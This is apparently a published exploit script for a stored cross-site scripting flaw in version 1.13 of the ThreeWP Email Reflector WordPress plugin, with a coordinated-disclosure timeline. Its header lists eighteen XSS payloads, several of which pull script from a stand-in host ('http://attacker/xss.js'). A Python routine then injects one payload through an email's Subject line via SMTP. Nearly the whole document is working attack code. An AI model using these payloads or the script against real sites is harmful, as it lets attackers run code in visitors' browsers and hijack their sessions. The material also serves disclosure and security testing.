#!/usr/bin/python

'''

Author: loneferret of Offensive Security
Product: ThreeWP Email Reflector
Version: 1.13
Plugin Site: http://mindreantre.se/
Software Download: http://wordpress.org/extend/plugins/threewp-email-reflector/installation/

Timeline:
29 May 2012: Vulnerability reported to CERT
30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
23 Jul 2012: Update from CERT: Coordinated with vendor
08 Aug 2012: Public Disclosure

Installed On: Ubuntu Server LAMP 8.04
Wordpress: 3.3.1
Client Test OS: MAC OS Lion
Browser Used: Firefox 12

Injection Point: Subject
Injection Payload(s):
1: ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
2: <SCRIPT>alert('XSS')</SCRIPT>
3: <SCRIPT SRC=http://attacker/xss.js></SCRIPT>
4: <SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
5: <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
6: <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
7: <SCRIPT SRC="http://attacker/xss.jpg"></SCRIPT>
8: </TITLE><SCRIPT>alert("XSS");</SCRIPT>
9: <SCRIPT/XSS SRC="http://attacker/xss.js"></SCRIPT>
10: <SCRIPT SRC=//attacker/.j>
11: <<SCRIPT>alert("XSS");//<</SCRIPT>
12: <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
13: <SCRIPT a=">" SRC="http://attacker/xss.js"></SCRIPT>
14: <SCRIPT ="blah" SRC="http://attacker/xss.js"></SCRIPT>
15: <SCRIPT a="blah" '' SRC="http://attacker/xss.js"></SCRIPT>
16: <SCRIPT "a='>'" SRC="http://attacker/xss.js"></SCRIPT>
17: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://attacker/xss.js"></SCRIPT>
18: <SCRIPT a=">'>" SRC="http://attacker/xss.js"></SCRIPT>

'''


#!/usr/bin/python
import smtplib, urllib2
 
payload = """<SCRIPT/XSS SRC="http://attacker/xss.js"></SCRIPT>"""
 
def sendMail(dstemail, frmemail, smtpsrv, username, password):
        msg  = "From: hacker@offsec.local\n"
        msg += "To: victim@victim.local\n"
        msg += 'Date: Today\r\n'
        msg += "Subject: XSS" + payload + "\n"
        msg += "Content-type: text/html\n\n"
        msg += "XSS.\r\n\r\n"
        server = smtplib.SMTP(smtpsrv)
        server.login(username,password)
        try:
                server.sendmail(frmemail, dstemail, msg)
        except Exception, e:
                print "[-] Failed to send email:"
                print "[*] " + str(e)
        server.quit()
 
username = "hacker@offsec.local"
password = "123456"
dstemail = "victim@victim.local"
frmemail = "hacker@offsec.local"
smtpsrv  = "172.16.84.171"
 
print "[*] Sending Email"
sendMail(dstemail, frmemail, smtpsrv, username, password)
